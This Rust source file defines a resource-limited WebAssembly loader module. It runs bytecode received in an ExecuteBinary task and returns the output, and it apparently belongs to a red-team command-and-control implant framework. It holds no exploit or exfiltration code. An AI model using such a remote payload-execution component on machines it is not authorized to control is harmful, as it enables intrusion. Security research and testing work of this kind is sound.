//! Resource-limited loader for WASI-compatible WebAssembly bytecode.
//!
//! The module consumes an `ExecuteBinary` body. `bin` contains the module,
//! `entry_point` defaults to `_start`, `name` becomes WASI `argv[0]`, `args`
//! are appended to the argument vector, `data` is exposed as stdin, and
//! `param` entries become environment variables. The reserved `fuel`,
//! `memory_limit`, and `output_limit` parameters configure runtime limits.

mod runtime;
mod wasi;
mod wasix;

use crate::prelude::*;
use async_trait::async_trait;
use malefic_proto::proto::modulepb::BinaryResponse;

pub struct WasmLoader;

#[async_trait]
#[module_impl("wasmloader")]
impl Module for WasmLoader {}

#[async_trait]
impl ModuleImpl for WasmLoader {
    async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> ModuleResult {
        let request = check_request!(receiver, Body::ExecuteBinary)?;
        let options = runtime::RuntimeOptions::new(
            request.name,
            request.entry_point,
            request.args,
            request.param,
            request.data,
        )
        .map_err(anyhow::Error::msg)?;
        let result = runtime::execute(&request.bin, options).map_err(anyhow::Error::msg)?;

        Ok(TaskResult::new_with_body(
            id,
            Body::BinaryResponse(BinaryResponse {
                status: result.exit_code,
                message: result.stderr.clone(),
                data: result.stdout,
                err: if result.exit_code == 0 {
                    String::new()
                } else {
                    String::from_utf8_lossy(&result.stderr).into_owned()
                },
            }),
        ))
    }
}
